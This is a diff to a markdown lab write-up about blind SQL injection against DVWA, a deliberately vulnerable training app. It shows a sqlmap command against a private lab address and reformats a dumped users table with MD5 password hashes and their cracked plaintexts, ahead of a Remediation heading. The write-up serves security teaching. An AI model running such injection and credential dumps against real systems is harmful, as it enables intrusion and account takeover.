@@ -46,15 +46,13 @@ sqlmap -u "http://192.168.74.16/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Sub
 
 <img width="793" height="858" alt="image" src="https://github.com/user-attachments/assets/64c3b1eb-ad09-46f8-9acd-9ec96e842458" />
 
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-| user_id | user    | avatar                                                | password                                    | last_name | first_name |
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
-| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
-| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
-| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
-| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
-+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
+| **user_id** | **user** | **avatar** | **password** | **last_name** | **first_name** |
+| --- | --- | --- | --- | --- | --- |
+| 1 | admin | http://172.16.123.129/dvwa/hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin |
+| 2 | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon |
+| 3 | 1337 | http://172.16.123.129/dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack |
+| 4 | pablo | http://172.16.123.129/dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo |
+| 5 | smithy | http://172.16.123.129/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob |
 
 
 # Remediation 
